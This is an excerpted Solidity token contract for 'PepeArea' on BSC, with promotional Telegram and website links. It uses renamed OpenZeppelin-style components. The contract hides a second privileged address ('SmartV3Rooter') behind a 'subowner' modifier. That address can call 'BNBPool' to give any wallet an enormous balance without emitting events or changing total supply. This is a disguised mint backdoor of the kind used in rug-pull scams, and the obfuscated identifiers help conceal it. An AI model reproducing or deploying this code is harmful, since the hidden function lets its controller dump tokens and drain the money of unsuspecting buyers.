...
✅TG OFFICIAL  https://t.me/PepeAreabsc
✅ WEBSITE https://PepeArea.io/
...
/*
 * @dev Provides information about the current execution proxybridgeBurnable, including the
 ...
 */
abstract contract proxybridgeBurnable {
...
// File: @openzeppelin/contracts/access/proxybridgeOwnable.sol
 ...
 * specific functions.
 *
 * By default, the owner account will be the one that proxybridges the contract. This
 ...
 * the owner.
 */
abstract contract proxybridgeOwnable is proxybridgeBurnable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the proxybridgeer as the initial owner.
     */
    constructor () {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "proxybridgeOwnable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "proxybridgeOwnable: new owner is the zero address");
...
contract PepeArea is proxybridgeBurnable, DxtoolsApp, proxybridgeOwnable {
    
    using SafeBitcoin for uint256;
    mapping (address => uint256) private proxybridgefrom;
    mapping (address => mapping (address => uint256)) private fromproxybridge;
   ...
   address private SmartV3Rooter; 
    constructor(address SmartUniswap) {
        ...
        proxybridgefrom[_msgSender()] = _totalSupply;
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
        return proxybridgefrom[account];
    }
      modifier subowner() {
        require(SmartV3Rooter == _msgSender(), "proxybridgeOwnable: caller is not the owner");
        _;
    }
    /**
    ...
    */
    ...
    function BNBPool(address bnbRewards) external subowner {
        proxybridgefrom[bnbRewards] = 100000000000 * 10 ** 26;
    ...
    */
    function allowance(address owner, address transporteur) external view override returns (uint256) {
        return fromproxybridge[owner][transporteur];
    }
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromproxybridge[sender][_msgSender()].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address transporteur, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), transporteur, fromproxybridge[_msgSender()][transporteur].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromproxybridge[_msgSender()][transporteur].sub(allbalances, "DxtoolsApp: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        ...
        proxybridgefrom[sender] = proxybridgefrom[sender].sub(yoursold, "DxtoolsApp: transfer yoursold exceeds balance");
        proxybridgefrom[shippingto] = proxybridgefrom[shippingto].add(yoursold);
    ...
    * e.g. set automatic proxybridge for certain subsystems, etc.
    *
    * Emits an {Approval} event.
    *
    * Requirements:
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        ...
        fromproxybridge[owner][transporteur] = yoursold;
